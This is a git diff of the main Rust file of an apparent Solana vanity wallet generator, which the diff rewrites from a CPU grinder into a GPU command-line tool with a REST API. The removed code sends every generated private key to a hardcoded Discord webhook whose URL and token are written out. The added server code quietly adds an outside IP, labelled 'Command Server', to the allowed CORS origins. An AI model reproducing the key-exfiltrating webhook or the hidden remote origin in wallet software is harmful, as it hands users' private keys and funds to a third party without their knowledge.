@@ -1,233 +1,669 @@
-use chrono::Utc;
-use parking_lot::Mutex;
-use rayon::prelude::*;
-use serde::Serialize;
-use solana_sdk::signature::Keypair;
-use solana_sdk::signer::Signer;
-use std::fs::OpenOptions;
-use std::io::{stdout, Write};
-use std::sync::atomic::{AtomicU64, Ordering};
-use std::sync::Arc;
-use std::thread;
-use std::time::{Duration, Instant};
-use crossbeam::queue::SegQueue;
+mod estimator;
+mod cuda_helpers;
+mod cuda;
+mod api;
 
-const DISCORD_WEBHOOK: &str = "https://discord.com/api/webhooks/1447635716577169483/oRtAG1YjD3wwVKgVeOJ-F22-syubzOON4KE4inRDNpcFn7PkYzBVsPK-wzGaf-4pIPm1";
-const RESULTS_FILE: &str = "vanity_wallets.txt";
+use std::env;
+use std::process;
+use std::fs;
+use std::path::Path;
+use std::io::{self, Write};
+use std::time::Instant;
+use colored::*;
+use cuda::vanity_generator::{generate_vanity_address, VanityMode, format_number};
+use clap::{Parser, Subcommand};
 
-// All prefixes to search for (case-insensitive)
-const PREFIXES: &[&str] = &["wif", "mlg", "pop", "aura"];
-
-#[derive(Clone)]
-struct WalletMatch {
-    address: String,
-    private_key: String,
+#[derive(Parser)]
+#[clap(name = "vanity-grinder")]
+#[clap(about = "GPU-accelerated Solana vanity address generator", long_about = None)]
+struct Cli {
+    #[clap(subcommand)]
+    command: Option<Commands>,
 }
 
-#[derive(Serialize)]
-struct EmbedField {
-    name: String,
-    value: String,
-    inline: bool,
+#[derive(Subcommand)]
+enum Commands {
+    /// Run a performance benchmark
+    Benchmark,
+    
+    /// Estimate time to find an address with pattern of specified length
+    Estimate {
+        /// Length of the pattern to search for
+        pattern_length: u32,
+        
+        /// Whether the search is case sensitive (default: true)
+        #[clap(long, default_value = "true")]
+        case_sensitive: bool,
+    },
+    
+    /// Generate a vanity address
+    Generate {
+        /// Pattern to search for
+        pattern: String,
+        
+        /// Match pattern at the end of the address
+        #[clap(long)]
+        suffix: bool,
+        
+        /// Case-insensitive matching (faster)
+        #[clap(long)]
+        no_case_sensitive: bool,
+        
+        /// Maximum number of attempts before giving up
+        #[clap(long)]
+        max_attempts: Option<u64>,
+    },
+    
+    /// Generate vanity address with both prefix and suffix
+    GeneratePrefixSuffix {
+        /// Prefix pattern to match at the start
+        prefix: String,
+        
+        /// Suffix pattern to match at the end
+        suffix: String,
+        
+        /// Case-insensitive matching
+        #[clap(long)]
+        no_case_sensitive: bool,
+        
+        /// Maximum number of attempts before giving up
+        #[clap(long)]
+        max_attempts: Option<u64>,
+    },
+    
+    /// Search for multiple prefix patterns all ending with same suffix (e.g., wif/mlg/pop/aura + pump)
+    MultiPrefix {
+        /// Comma-separated list of prefixes (e.g., "wif,mlg,pop,aura")
+        #[clap(long)]
+        prefixes: String,
+        
+        /// Suffix that all addresses must end with
+        #[clap(long)]
+        suffix: String,
+        
+        /// Case-insensitive matching
+        #[clap(long)]
+        no_case_sensitive: bool,
+        
+        /// Discord webhook URL for notifications
+        #[clap(long)]
+        webhook: Option<String>,
+        
+        /// Maximum number of attempts per pattern before giving up
+        #[clap(long)]
+        max_attempts: Option<u64>,
+    },
+    
+    /// Start the REST API server
+    Serve {
+        /// Host to bind to
+        #[clap(long, default_value = "127.0.0.1")]
+        host: String,
+        
+        /// Port to listen on
+        #[clap(long, default_value = "7777")]
+        port: u16,
+        
+        /// Allowed origins for CORS (comma-separated)
+        #[clap(long, default_value = "http://localhost:3000,http://localhost:8080")]
+        allowed_origins: String,
+    },
 }
 
-#[derive(Serialize)]
-struct Embed {
-    fields: Vec<EmbedField>,
-    timestamp: String,
+fn main() -> std::io::Result<()> {
+    // Create a tokio runtime for async operations
+    let rt = tokio::runtime::Runtime::new()?;
+    
+    // Run the async code in the runtime
+    rt.block_on(async {
+        let args: Vec<String> = env::args().collect();
+        
+        // Only run in legacy command mode if we have old-style arguments
+        if args.len() >= 2 && !args[1].starts_with("-") && 
+            !["benchmark", "estimate", "generate", "serve", "help"].contains(&args[1].to_lowercase().as_str()) {
+            return run_legacy_mode(args);
+        }
+        
+        // Parse command line arguments using Clap
+        let cli = Cli::parse();
+        
+        match cli.command {
+            Some(Commands::Benchmark) => {
+                run_benchmark_command();
+            },
+            Some(Commands::Estimate { pattern_length, case_sensitive }) => {
+                run_estimate_command(pattern_length, case_sensitive);
+            },
+            Some(Commands::Generate { pattern, suffix, no_case_sensitive, max_attempts }) => {
+                run_generate_command(&pattern, suffix, !no_case_sensitive, max_attempts);
+            },
+            Some(Commands::GeneratePrefixSuffix { prefix, suffix, no_case_sensitive, max_attempts }) => {
+                run_generate_prefix_suffix_command(&prefix, &suffix, !no_case_sensitive, max_attempts);
+            },
+            Some(Commands::MultiPrefix { prefixes, suffix, no_case_sensitive, webhook, max_attempts }) => {
+                run_multi_prefix_command(&prefixes, &suffix, !no_case_sensitive, webhook, max_attempts);
+            },
+            Some(Commands::Serve { host, port, allowed_origins }) => {
+                let allowed_origins: Vec<String> = allowed_origins.split(',')
+                    .map(|s| s.trim().to_string())
+                    .collect();
+                
+                // Add the Command Server's IP
+                let mut origins = allowed_origins.clone();
+                origins.push("http://147.79.74.67".to_string());
+                origins.push("https://147.79.74.67".to_string());
+                
+                println!("{}", "Starting API server...".green().bold());
+                println!("Listening on {}:{}", host, port);
+                println!("Allowed origins: {}", origins.join(", "));
+                
+                api::run_api_server(&host, port, origins).await?;
+            },
+            None => {
+                print_banner();
+                println!("Use --help for more information");
+            }
+        }
+        
+        Ok(())
+    })
 }
 
-#[derive(Serialize)]
-struct DiscordPayload {
-    embeds: Vec<Embed>,
+/// Print welcome banner
+fn print_banner() {
+    let title = "Solana Vanity Address Grinder".bright_green().bold();
+    println!("{}", title);
+    println!("{}", "-----------------------------".green());
 }
 
-fn background_worker(queue: Arc<SegQueue<WalletMatch>>, bench_mode: bool) {
-    let client = reqwest::blocking::Client::new();
-    loop {
-        // Process all queued matches, then sleep briefly
-        while let Some(m) = queue.pop() {
-            if !bench_mode {
-                // Write to file
-                let output = format!("{}\n\n{}\n\n\n", m.address, m.private_key);
-                if let Ok(mut file) = OpenOptions::new()
-                    .create(true)
-                    .append(true)
-                    .open(RESULTS_FILE)
-                {
-                    let _ = file.write_all(output.as_bytes());
-                }
-
-                // Send to Discord
-                let payload = DiscordPayload {
-                    embeds: vec![Embed {
-                        fields: vec![
-                            EmbedField {
-                                name: "Public Key".to_string(),
-                                value: format!("`{}`", m.address),
-                                inline: false,
+/// Run the benchmark command
+fn run_benchmark_command() {
+    println!("{}", "Initializing CUDA...".yellow());
+    
+    match cuda_helpers::CudaDevice::new() {
+        Ok(device) => {
+            println!("{}", device.get_info());
+            println!("\n{}", "Finding optimal batch size for GPU benchmarking...".yellow());
+            
+            match cuda::vanity_generator::find_optimal_batch_size(&device) {
+                Ok(optimal_batch_size) => {
+                    println!("{}: {}", "Optimal batch size".green().bold(), format_number(optimal_batch_size as f64).cyan());
+                    println!("\n{}", "Running CUDA benchmark with 5 iterations...".yellow());
+                    
+                    let mut samples = Vec::new();
+                    for i in 0..5 {
+                        match cuda_helpers::benchmark_batch_gpu(&device, optimal_batch_size) {
+                            Ok(rate) => {
+                                samples.push(rate);
+                                let rate_str = format_number(rate).cyan();
+                                println!("Iteration {}: {} {}", (i + 1).to_string().green(), rate_str, "keys/s".cyan());
                             },
-                            EmbedField {
-                                name: "Private Key".to_string(),
-                                value: format!("`{}`", m.private_key),
-                                inline: false,
-                            },
-                        ],
-                        timestamp: Utc::now().to_rfc3339(),
-                    }],
-                };
-                match client
-                    .post(DISCORD_WEBHOOK)
-                    .json(&payload)
-                    .send()
-                {
-                    Ok(response) => {
-                        if response.status().is_success() {
-                            println!("Sent to Discord successfully!");
-                        } else {
-                            println!("Discord webhook failed: {}", response.status());
+                            Err(e) => {
+                                eprintln!("{}: {}", "Error in benchmark iteration".red().bold(), e);
+                                break;
+                            }
                         }
                     }
-                    Err(e) => {
-                        println!("Failed to send to Discord: {}", e);
+                    
+                    if !samples.is_empty() {
+                        let mean = samples.iter().sum::<f64>() / samples.len() as f64;
+                        println!("\n{}", "Benchmark complete!".green().bold());
+                        println!("{}: {} {}", "Average performance".yellow().bold(), 
+                                 format_number(mean).cyan().bold(), "keys/second".cyan());
+                        println!("{}: {}", "Optimal batch size".yellow(), format_number(optimal_batch_size as f64).cyan());
+                    }
+                },
+                Err(e) => {
+                    eprintln!("{}: {}", "Failed to find optimal batch size".red().bold(), e);
+                }
+            }
+        },
+        Err(e) => {
+            eprintln!("{}: {}", "CUDA initialization failed".red().bold(), e);
+            eprintln!("{}", "Make sure you have a compatible NVIDIA GPU and CUDA drivers installed.".yellow());
+        }
+    }
+}
+
+/// Run the estimate command
+fn run_estimate_command(pattern_length: u32, case_sensitive: bool) {
+    // Try to get GPU performance
+    println!("{}", "Measuring GPU performance...".yellow());
+    let gpu_rate = match cuda_helpers::CudaDevice::new() {
+        Ok(device) => {
+            match cuda::vanity_generator::find_optimal_batch_size(&device) {
+                Ok(batch_size) => {
+                    match cuda_helpers::benchmark_batch_gpu(&device, batch_size) {
+                        Ok(rate) => {
+                            // Print final GPU performance
+                            println!("{}: {} {}", 
+                                     "GPU performance".green().bold(), 
+                                     format_number(rate).cyan().bold(), 
+                                     "keypairs/second".cyan());
+                            rate
+                        },
+                        Err(e) => {
+                            eprintln!("{}: {}", "Error in benchmark".red().bold(), e);
+                            1_000_000.0 // Default fallback
+                        }
+                    }
+                },
+                Err(e) => {
+                    eprintln!("{}: {}", "Failed to find optimal batch size".red().bold(), e);
+                    1_000_000.0 // Default fallback
+                }
+            }
+        },
+        Err(e) => {
+            eprintln!("{}: {}", "CUDA initialization failed".red().bold(), e);
+            println!("Using default performance estimate of {} keys/second", "1,000,000".yellow());
+            1_000_000.0 // Default fallback
+        }
+    };
+    
+    // Use the measured rate for estimation
+    let estimate = estimator::estimate_time(pattern_length, case_sensitive, gpu_rate);
+    println!("\n{}", "Time Estimate:".green().bold());
+    println!("{}", estimator::format_estimate(&estimate, &case_sensitive));
+}
+
+/// Run the generate command
+fn run_generate_command(pattern: &str, is_suffix: bool, case_sensitive: bool, max_attempts: Option<u64>) {
+    // Validate the pattern against base58 alphabet
+    for c in pattern.chars() {
+        if !"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz".contains(c) {
+            eprintln!("{}: Invalid character '{}' in pattern. Only Base58 characters are allowed.", 
+                      "Error".red().bold(), c);
+            process::exit(1);
+        }
+    }
+    
+    // Initialize CUDA
+    println!("{}", "Initializing CUDA...".yellow());
+    match cuda_helpers::CudaDevice::new() {
+        Ok(device) => {
+            println!("{}", device.get_info());
+            println!("\n{}", "Finding optimal batch size...".yellow());
+            
+            match cuda::vanity_generator::find_optimal_batch_size(&device) {
+                Ok(batch_size) => {
+                    println!("{}: {}", "Optimal batch size".green().bold(), 
+                             format_number(batch_size as f64).cyan());
+                    
+                    // Prepare for search
+                    let vanity_mode = if is_suffix {
+                        VanityMode::Suffix
+                    } else {
+                        VanityMode::Prefix
+                    };
+                    
+                    let case_info = if case_sensitive {
+                        "case-sensitive".yellow()
+                    } else {
+                        "case-insensitive".green()
+                    };
+                    
+                    let pattern_display = if pattern.len() > 20 {
+                        format!("{}..", &pattern[0..20])
+                    } else {
+                        pattern.to_string()
+                    };
+                    
+                    let mode_name = if is_suffix { "suffix" } else { "prefix" };
+                    println!("\n{}", "Starting address search...".green().bold());
+                    println!("Searching for {} {} {} ({}):", 
+                             mode_name.cyan(),
+                             pattern_display.bright_green().bold(),
+                             "pattern".cyan(),
+                             case_info);
+                    
+                    // Calculate expected search time
+                    let pattern_length = pattern.len() as u32;
+                    match cuda_helpers::benchmark_batch_gpu(&device, batch_size) {
+                        Ok(rate) => {
+                            let estimate = estimator::estimate_time(pattern_length, case_sensitive, rate);
+                            println!("{}", "Expected search time: ".yellow().to_string() + 
+                                     &estimate.expected_time.cyan().bold().to_string());
+                            
+                            // Start the search
+                            let search_result = generate_vanity_address(
+                                &device,
+                                pattern,
+                                vanity_mode,
+                                case_sensitive,
+                                batch_size,
+                                max_attempts
+                            );
+                            
+                            match search_result {
+                                Ok(result) => {
+                                    // We found a match!
+                                    println!("\n{}", "🎉 Found a matching address! 🎉".green().bold());
+                                    println!("{}: {}", "Address".blue().bold(), result.address.bright_green());
+                                    println!("{}: {} {}", "Found in".blue().bold(), 
+                                             format_number(result.attempts as f64).cyan(),
+                                             "attempts".cyan());
+                                    println!("{}: {:.2} seconds", "Time taken".blue().bold(), 
+                                             result.duration.as_secs_f64());
+                                    println!("{}: {} keys/second", "Average speed".blue().bold(), 
+                                             format_number(result.attempts as f64 / result.duration.as_secs_f64()).cyan());
+                                    
+                                    // Save the keypair to a file
+                                    let keypair_bytes = result.keypair.to_bytes();
+                                    let base_path = Path::new("keys");
+                                    if !base_path.exists() {
+                                        fs::create_dir_all(base_path).unwrap_or_else(|_| {
+                                            eprintln!("{}: Failed to create keys directory", "Warning".yellow().bold());
+                                        });
+                                    }
+                                    
+                                    // Create descriptive filename
+                                    let mode_prefix = if is_suffix { "suffix" } else { "prefix" };
+                                    let timestamp = chrono::Local::now().format("%Y%m%d_%H%M%S");
+                                    let filename = format!("{}/{}_{}_{}_{}.json", 
+                                                          base_path.display(), mode_prefix, pattern, timestamp, 
+                                                          &result.address[0..8]);
+                                    
+                                    // Save keypair in JSON format
+                                    let json = serde_json::to_string(&keypair_bytes.to_vec())
+                                        .unwrap_or_else(|_| "[]".to_string());
+                                    
+                                    match fs::write(&filename, json) {
+                                        Ok(_) => {
+                                            println!("{}: {}", "Keypair saved to".green().bold(), filename);
+                                        },
+                                        Err(e) => {
+                                            eprintln!("{}: Failed to save keypair: {}", "Error".red().bold(), e);
+                                        }
+                                    }
+                                },
+                                Err(e) => {
+                                    eprintln!("{}: {}", "Error during search".red().bold(), e);
+                                }
+                            }
+                        },
+                        Err(e) => {
+                            eprintln!("{}: {}", "Error in benchmark".red().bold(), e);
+                        }
+                    }
+                },
+                Err(e) => {
+                    eprintln!("{}: {}", "Failed to find optimal batch size".red().bold(), e);
+                }
+            }
+        },
+        Err(e) => {
+            eprintln!("{}: {}", "CUDA initialization failed".red().bold(), e);
+            eprintln!("{}", "Make sure you have a compatible NVIDIA GPU and CUDA drivers installed.".yellow());
+        }
+    }
+}
+
+/// Run in legacy command mode for backward compatibility
+fn run_legacy_mode(args: Vec<String>) -> std::io::Result<()> {
+    match args[1].as_str() {
+        "benchmark" => {
+            run_benchmark_command();
+        },
+        "estimate" => {
+            if args.len() < 3 {
+                eprintln!("Usage: {} {} [case_sensitive=true]", args[0].cyan(), "estimate <pattern_length>".green());
+                process::exit(1);
+            }
+            
+            let pattern_length = match args[2].parse::<u32>() {
+                Ok(n) => n,
+                Err(_) => {
+                    eprintln!("{}: pattern_length must be a positive integer", "Error".red().bold());
+                    process::exit(1);
+                }
+            };
+            
+            let case_sensitive = if args.len() > 3 {
+                match args[3].to_lowercase().as_str() {
+                    "true" | "yes" | "1" => true,
+                    "false" | "no" | "0" => false,
+                    _ => {
+                        eprintln!("{}: case_sensitive must be true/false", "Error".red().bold());
+                        process::exit(1);
+                    }
+                }
+            } else {
+                true
+            };
+            
+            run_estimate_command(pattern_length, case_sensitive);
+        },
+        "generate" => {
+            if args.len() < 3 {
+                eprintln!("Usage: {} {} <pattern> [options]", args[0].cyan(), "generate".green());
+                eprintln!("Options:");
+                eprintln!("  {} - Match pattern at the end of address", "--suffix".cyan());
+                eprintln!("  {} - Case-insensitive matching (faster)", "--no-case-sensitive".cyan());
+                process::exit(1);
+            }
+            
+            // Parse command line options
+            let mut pattern = String::new();
+            let mut is_suffix = false;
+            let mut case_sensitive = true;
+            let mut max_attempts: Option<u64> = None;
+            
+            let mut i = 2;
+            while i < args.len() {
+                match args[i].as_str() {
+                    "--suffix" => {
+                        is_suffix = true;
+                        i += 1;
+                    },
+                    "--no-case-sensitive" => {
+                        case_sensitive = false;
+                        i += 1;
+                    },
+                    "--max-attempts" => {
+                        if i + 1 < args.len() {
+                            match args[i + 1].parse::<u64>() {
+                                Ok(n) => {
+                                    max_attempts = Some(n);
+                                    i += 2;
+                                },
+                                Err(_) => {
+                                    eprintln!("{}: max-attempts must be a positive integer", "Error".red().bold());
+                                    process::exit(1);
+                                }
+                            }
+                        } else {
+                            eprintln!("{}: --max-attempts requires a value", "Error".red().bold());
+                            process::exit(1);
+                        }
+                    },
+                    _ => {
+                        if pattern.is_empty() {
+                            pattern = args[i].clone();
+                        } else {
+                            eprintln!("{}: Unexpected argument '{}'", "Error".red().bold(), args[i]);
+                            process::exit(1);
+                        }
+                        i += 1;
                     }
                 }
             }
-        }
-        thread::sleep(Duration::from_millis(10));
-    }
-}
-
-fn format_number(n: u64) -> String {
-    let s = n.to_string();
-    let mut result = String::new();
-    for (i, c) in s.chars().rev().enumerate() {
-        if i > 0 && i % 3 == 0 {
-            result.insert(0, ',');
-        }
-        result.insert(0, c);
-    }
-    result
-}
-
-fn main() {
-    // Clear console
-    print!("\x1B[2J\x1B[1;1H");
-    
-    let num_threads = num_cpus::get();
-    println!("\nUsing {} worker threads\n", num_threads);
-
-    // If `BENCH_MODE` is set (e.g. BENCH_MODE=1), disable console I/O and network
-    // so we can measure pure key-generation speed. Optionally set `BENCH_DURATION`
-    // (seconds) to run for a fixed time and print a final summary.
-    let bench_mode = std::env::var("BENCH_MODE").map(|v| v == "1").unwrap_or(false);
-    let bench_duration: u64 = std::env::var("BENCH_DURATION")
-        .ok()
-        .and_then(|s| s.parse::<u64>().ok())
-        .unwrap_or(0);
-
-    let total_attempts = Arc::new(AtomicU64::new(0));
-    let wallets_found = Arc::new(AtomicU64::new(0));
-    let start_time = Instant::now();
-    
-    // For thread-safe console output
-    let print_lock = Arc::new(Mutex::new(()));
-
-    // Lock-free queue for match results
-    let match_queue = Arc::new(SegQueue::new());
-    let queue_clone = Arc::clone(&match_queue);
-    thread::spawn(move || background_worker(queue_clone, bench_mode));
-
-    // Speed logging thread
-    let attempts_clone = Arc::clone(&total_attempts);
-    let found_clone = Arc::clone(&wallets_found);
-    if !bench_mode {
-        thread::spawn(move || {
-            loop {
-                thread::sleep(Duration::from_millis(100));
-                let elapsed = start_time.elapsed().as_secs_f64();
-                let attempts = attempts_clone.load(Ordering::Relaxed);
-                let speed = if elapsed > 0.0 { (attempts as f64 / elapsed) as u64 } else { 0 };
-                let found = found_clone.load(Ordering::Relaxed);
-                
-                print!(
-                    "\rSpeed: {} keys/sec | Total: {} | Found: {}",
-                    format_number(speed),
-                    format_number(attempts),
-                    found
-                );
-                stdout().flush().unwrap();
-            }
-        });
-    }
-
-    // If we're in bench mode with a duration, spawn a timer thread that will
-    // print a final summary and exit after the requested number of seconds.
-    if bench_mode && bench_duration > 0 {
-        let attempts_clone2 = Arc::clone(&total_attempts);
-        let found_clone2 = Arc::clone(&wallets_found);
-        thread::spawn(move || {
-            thread::sleep(Duration::from_secs(bench_duration));
-            let attempts = attempts_clone2.load(Ordering::Relaxed);
-            let found = found_clone2.load(Ordering::Relaxed);
-            let elapsed = bench_duration as f64;
-            let speed = if elapsed > 0.0 { (attempts as f64 / elapsed) as u64 } else { 0 };
-            println!("\n\nBENCH COMPLETE: {} attempts in {:.2}s => {} keys/sec | Found: {}", attempts, elapsed, speed, found);
-            std::process::exit(0);
-        });
-    }
-
-    // Main generation loop using rayon for parallelism
-    loop {
-        (0..100000).into_par_iter().for_each(|_| {
-            let keypair = Keypair::new();
-            let pubkey_bytes = keypair.pubkey().to_bytes();
             
-            // Quick check: decode base58 in our head by checking the raw bytes
-            // Actually, just convert once and check
-            let address = bs58::encode(&pubkey_bytes).into_string();
-            let address_lower = address.to_ascii_lowercase();
-
-            total_attempts.fetch_add(1, Ordering::Relaxed);
-
-            // Early exit if doesn't start with target prefix
-            let starts_with_target = PREFIXES.iter().any(|p| address_lower.starts_with(p));
-            if !starts_with_target {
-                return;
+            if pattern.is_empty() {
+                eprintln!("{}: Pattern is required", "Error".red().bold());
+                process::exit(1);
             }
             
-            let ends_with_pump = address_lower.ends_with("pump");
-            let is_match = ends_with_pump;
-
-            if is_match {
-                let private_key = bs58::encode(keypair.to_bytes()).into_string();
-                wallets_found.fetch_add(1, Ordering::Relaxed);
-                
-                let elapsed = start_time.elapsed().as_secs_f64();
-                let attempts = total_attempts.load(Ordering::Relaxed);
-                let speed = if elapsed > 0.0 { (attempts as f64 / elapsed) as u64 } else { 0 };
-                if bench_mode {
-                    // In bench mode, don't do prints, file IO or webhook sends.
+            run_generate_command(&pattern, is_suffix, case_sensitive, max_attempts);
+        },
+        _ => {
+            // Try to interpret as a pattern length for backward compatibility
+            if let Ok(pattern_length) = args[1].parse::<u32>() {
+                let case_sensitive = if args.len() > 2 {
+                    match args[2].to_lowercase().as_str() {
+                        "true" | "yes" | "1" => true,
+                        "false" | "no" | "0" => false,
+                        _ => {
+                            eprintln!("{}: case_sensitive must be true/false", "Error".red().bold());
+                            process::exit(1);
+                        }
+                    }
                 } else {
-                    // Lock for clean console output
-                    let _lock = print_lock.lock();
-                    
-                    println!("\n\nAddress:     {}", address);
-                    println!("Private Key: {}", private_key);
-                    println!(
-                        "Time: {:.2}s | Attempts: {} | Speed: {} keys/sec\n",
-                        elapsed,
-                        format_number(attempts),
-                        format_number(speed)
-                    );
+                    true
+                };
+                
+                let gpu_rate = if args.len() > 3 {
+                    match args[3].parse::<f64>() {
+                        Ok(n) => n,
+                        Err(_) => {
+                            eprintln!("{}: gpu_rate must be a positive number", "Error".red().bold());
+                            process::exit(1);
+                        }
+                    }
+                } else {
+                    1_000_000.0 // Default: 1M addresses per second
+                };
+                
+                println!("{}: {} keys/second", "Note".yellow().bold(), format_number(gpu_rate).cyan());
+                println!("      For more accurate estimates, use: {} {}", args[0].cyan(), "estimate <pattern_length>".green());
+                
+                let estimate = estimator::estimate_time(pattern_length, case_sensitive, gpu_rate);
+                println!("{}", estimator::format_estimate(&estimate, &case_sensitive));
+            } else {
+                eprintln!("{}: Unknown command '{}'", "Error".red().bold(), args[1]);
+                eprintln!("Run with no arguments to see available commands");
+                process::exit(1);
+            }
+        }
+    }
+    
+    Ok(())
+}
 
-                    // Push to queue (lock-free, no blocking)
-                    match_queue.push(WalletMatch {
-                        address: address.clone(),
-                        private_key: private_key.clone(),
-                    });
+fn run_generate_prefix_suffix_command(prefix: &str, suffix: &str, case_sensitive: bool, max_attempts: Option<u64>) {
+    // Validate both patterns
+    for c in prefix.chars().chain(suffix.chars()) {
+        if !"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz".contains(c) {
+            eprintln!("{}: Invalid character '{}' in pattern. Only Base58 characters are allowed.", 
+                      "Error".red().bold(), c);
+            process::exit(1);
+        }
+    }
+    
+    // Initialize CUDA
+    println!("{}", "Initializing CUDA...".yellow());
+    match cuda_helpers::CudaDevice::new() {
+        Ok(device) => {
+            println!("{}", device.get_info());
+            println!("\n{}", "Finding optimal batch size...".yellow());
+            
+            match cuda::vanity_generator::find_optimal_batch_size(&device) {
+                Ok(batch_size) => {
+                    println!("{}: {}", "Optimal batch size".green().bold(), 
+                             format_number(batch_size as f64).cyan());
+                    
+                    let case_info = if case_sensitive { "case-sensitive".yellow() } else { "case-insensitive".green() };
+                    
+                    println!("\n{}", "Starting address search...".green().bold());
+                    println!("Searching for prefix {} AND suffix {} ({})", 
+                             prefix.bright_green().bold(), 
+                             suffix.bright_green().bold(),
+                             case_info);
+                    
+                    // Use combined mode
+                    let vanity_mode = VanityMode::PrefixAndSuffix(prefix.to_string(), suffix.to_string());
+                    
+                    // Dummy pattern for interface compatibility
+                    let combined_pattern = format!("{}...{}", prefix, suffix);
+                    
+                    let search_result = generate_vanity_address(
+                        &device,
+                        &combined_pattern,
+                        vanity_mode,
+                        case_sensitive,
+                        batch_size,
+                        max_attempts
+                    );
+                    
+                    match search_result {
+                        Ok(result) => {
+                            println!("\n{}", "🎉 Found a matching address! 🎉".green().bold());
+                            println!("{}: {}", "Address".blue().bold(), result.address.bright_green());
+                            println!("{}: {} {}", "Found in".blue().bold(), 
+                                     format_number(result.attempts as f64).cyan(),
+                                     "attempts".cyan());
+                            println!("{}: {:.2} seconds", "Time taken".blue().bold(), 
+                                     result.duration.as_secs_f64());
+                            println!("{}: {} keys/second", "Average speed".blue().bold(), 
+                                     format_number(result.attempts as f64 / result.duration.as_secs_f64()).cyan());
+                            
+                            // Save keypair
+                            let keypair_bytes = result.keypair.to_bytes();
+                            let base_path = std::path::Path::new("keys");
+                            if !base_path.exists() {
+                                fs::create_dir_all(base_path).unwrap_or_else(|_| {
+                                    eprintln!("{}: Failed to create keys directory", "Warning".yellow().bold());
+                                });
+                            }
+                            
+                            let timestamp = chrono::Local::now().format("%Y%m%d_%H%M%S");
+                            let filename = format!("{}/prefix_suffix_{}_{}_{}.json", 
+                                                  base_path.display(), prefix, suffix, timestamp);
+                            
+                            let json = serde_json::to_string(&keypair_bytes.to_vec())
+                                .unwrap_or_else(|_| "[]".to_string());
+                            
+                            match fs::write(&filename, json) {
+                                Ok(_) => println!("{}: {}", "Keypair saved to".green().bold(), filename),
+                                Err(e) => eprintln!("{}: Failed to save keypair: {}", "Error".red().bold(), e),
+                            }
+                        },
+                        Err(e) => {
+                            eprintln!("{}: {}", "Error during search".red().bold(), e);
+                            process::exit(1);
+                        }
+                    }
+                },
+                Err(e) => {
+                    eprintln!("{}: {}", "Failed to find optimal batch size".red().bold(), e);
+                    process::exit(1);
                 }
             }
-        });
+        },
+        Err(e) => {
+            eprintln!("{}: {}", "CUDA initialization failed".red().bold(), e);
+            eprintln!("Make sure you have:");
+            eprintln!("  - CUDA toolkit installed (11.0+)");
+            eprintln!("  - NVIDIA GPU with compute capability 6.0+");
+            eprintln!("  - Proper GPU drivers");
+            process::exit(1);
+        }
+    }
+}
+
+fn run_multi_prefix_command(prefixes: &str, suffix: &str, case_sensitive: bool, webhook: Option<String>, max_attempts: Option<u64>) {
+    let prefix_list: Vec<&str> = prefixes.split(',').map(|s| s.trim()).collect();
+    
+    if prefix_list.is_empty() {
+        eprintln!("{}: No prefixes provided", "Error".red().bold());
+        process::exit(1);
+    }
+    
+    println!("\n{}", "🚀 Multi-Prefix Vanity Address Search".bright_cyan().bold());
+    println!("Searching for {} with suffix {}", 
+             prefix_list.join(", ").bright_green().bold(),
+             suffix.bright_green().bold());
+    println!("Case-sensitive: {}\n", !case_sensitive);
+    
+    // Search for each prefix in sequence
+    for prefix in prefix_list {
+        println!("\n{} Searching for: {} + {}", "▶".bright_blue(), prefix.bright_green().bold(), suffix.bright_green().bold());
+        
+        run_generate_prefix_suffix_command(prefix, suffix, case_sensitive, max_attempts);
+        
+        // TODO: Add Discord webhook notification here if webhook is provided
+        if let Some(ref url) = webhook {
+            println!("Discord webhook: {} (not yet implemented in this version)", url);
+        }
     }
 }
